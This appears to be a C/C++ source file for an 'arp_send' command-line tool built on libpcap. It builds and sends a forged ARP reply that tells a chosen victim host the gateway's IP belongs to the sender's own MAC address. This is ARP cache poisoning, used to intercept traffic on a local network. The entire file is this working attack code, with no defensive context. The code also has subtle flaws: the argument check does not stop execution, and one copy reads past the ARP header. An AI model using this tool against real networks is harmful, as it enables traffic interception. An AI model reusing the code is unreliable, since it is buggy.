#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <net/if.h>


struct arp_hdr{
    uint16_t ar_hrd;//arp header structure
    uint16_t ar_pro;
    uint8_t ar_hln=6;
    uint8_t ar_pln=4;
    uint16_t ar_op;
    uint8_t ar_sha[6];
    uint8_t ar_sip[4];
    uint8_t ar_tha[6];
    uint8_t ar_tip[4];
    };


typedef struct packet_info{
    char *dev_name;
    uint8_t my_ip[4];
    uint8_t target_ip[4];
    uint8_t sender_ip[4];//pton use change
    u_char my_mac[6];
    u_char sender_mac[6];
    u_char target_mac[6];
    }PACKET_INFO;

int get_my_info(char * dev_name ,uint8_t *struc_p,u_char *struc_mac);
void convert_ip(uint8_t *ip_buf,char *argu_p);
void convert_mac(char *input_mac_str, u_char *mac_adr);
void input_eth_mac(u_char *edit_ether_mac,u_char *info_ether_mac);
void edit_ether_info(struct ether_header *eth_p,PACKET_INFO * eth_info);
void edit_arp_info(struct arp_hdr *arp_p,PACKET_INFO *arp_info);
void send_arp_packet(struct ether_header *eth_data,arp_hdr *arp_data,pcap_t *pack_d);



void send_arp_packet(struct ether_header *eth_data,arp_hdr *arp_data,pcap_t *pack_d);

int main(int argc, char *argv[])
{
   //at first argument num is  "filename dev senderIp targetIp sendermac targetmac"
    if (argc !=6){
        printf("\nplease check your argument form\n");
        printf("arp_send [device] [sender ip(1.1.1.1)] [target ip] [sender mac (1:1:1:1:1:1)] [target mac]\n");
    }
    PACKET_INFO pack_info;//structure

    pack_info.dev_name = argv[1];//input device in structure
    convert_ip((uint8_t *)&(pack_info.sender_ip),argv[2]);//convert argv2,3(sender,target IP)
    convert_ip((uint8_t *)&(pack_info.target_ip),argv[3]);
    convert_mac(argv[4],&pack_info.sender_mac[0]);
    convert_mac(argv[5],&pack_info.target_mac[0]);
    get_my_info(argv[1],&pack_info.my_ip[0],&pack_info.my_mac[0]);

    struct ether_header eth_hdr_p;
    edit_ether_info(&eth_hdr_p,&pack_info);

    struct arp_hdr arp_hdr_p;
    edit_arp_info(&arp_hdr_p,&pack_info);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * pd = pcap_open_live(pack_info.dev_name, BUFSIZ, 1, 300, errbuf);
    send_arp_packet(&eth_hdr_p,&arp_hdr_p,pd);


    return 0;
}


int get_my_info(char * dev_name ,uint8_t *struc_p,u_char *struc_mac)
{



    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) {
        printf("socket error\n");
        return -1;
    }

    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev_name);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0){
        printf("IpAddr ioctl() error\n");   // Get IP Adress
        return -1;
    }
    memcpy(struc_p,ifr.ifr_addr.sa_data+2,sizeof(uint32_t));

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0){
        printf("MAC ioctl() error\n");  //get mac addr
        return -1;
    }
    memcpy(struc_mac,ifr.ifr_hwaddr.sa_data,sizeof(u_char)*6);
    return 0;
}

void convert_ip(uint8_t *ip_buf,char *argu_p)
{
    uint32_t* ip_convert=(uint32_t*)malloc(sizeof(uint32_t));
    inet_pton(AF_INET,argu_p,ip_convert);
    memcpy(ip_buf,ip_convert,sizeof(u_char)*4);
    free(ip_convert);
}

void convert_mac(char *input_mac_str, u_char *mac_adr)
{
    u_int int_mac[6];
    sscanf(input_mac_str,"%x:%x:%x:%x:%x:%x",&int_mac[0],&int_mac[1],&int_mac[2],&int_mac[3],&int_mac[4],&int_mac[5]);
    for(int i=0;i<6;i++)
        *(mac_adr+i)=(u_char)int_mac[i];
}

void input_eth_mac(u_char *edit_ether_mac,u_char *info_ether_mac)
{
    for(int i=0;i<6;i++)
        edit_ether_mac[i]=info_ether_mac[i];
}

void edit_ether_info(struct ether_header *eth_p,PACKET_INFO * eth_info)
{
    input_eth_mac(eth_p->ether_dhost,eth_info->sender_mac);
    input_eth_mac(eth_p->ether_shost,eth_info->my_mac);
    eth_p->ether_type = htons(ETHERTYPE_ARP);
}

void edit_arp_info(struct arp_hdr *arp_p,PACKET_INFO *arp_info)
{
    memcpy(arp_p->ar_sip,arp_info->target_ip,sizeof(uint8_t)*4);//gateway ip->sender ip
    memcpy(arp_p->ar_tip,arp_info->sender_ip,sizeof(uint8_t)*4);//sender ip->target ip
    memcpy(arp_p->ar_sha,arp_info->my_mac,sizeof(u_char)*6);//my mac->sender hw
    memcpy(arp_p->ar_tha,arp_info->sender_mac,sizeof(u_char)*6);//sender mac->target hw
    arp_p->ar_hrd = htons(0x0001);
    arp_p->ar_pro = htons(0x0800);
    arp_p->ar_op = htons(0x0002);
}


void send_arp_packet(struct ether_header *eth_data,arp_hdr *arp_data,pcap_t *pack_d)
{
    int packet_len=sizeof(ether_header);
    u_char *make_packet = (u_char*)malloc(100* sizeof(u_char));//makepacket
    memcpy(make_packet,eth_data,packet_len);
    packet_len +=sizeof(arp_hdr);
    memcpy(make_packet+sizeof(ether_header),arp_data,packet_len);

    if(pcap_sendpacket(pack_d,make_packet,packet_len)!=0)
        pcap_perror(pack_d,"packet send error");
    else
        printf("arp_send done.\n");

    free(make_packet);
    return;

}

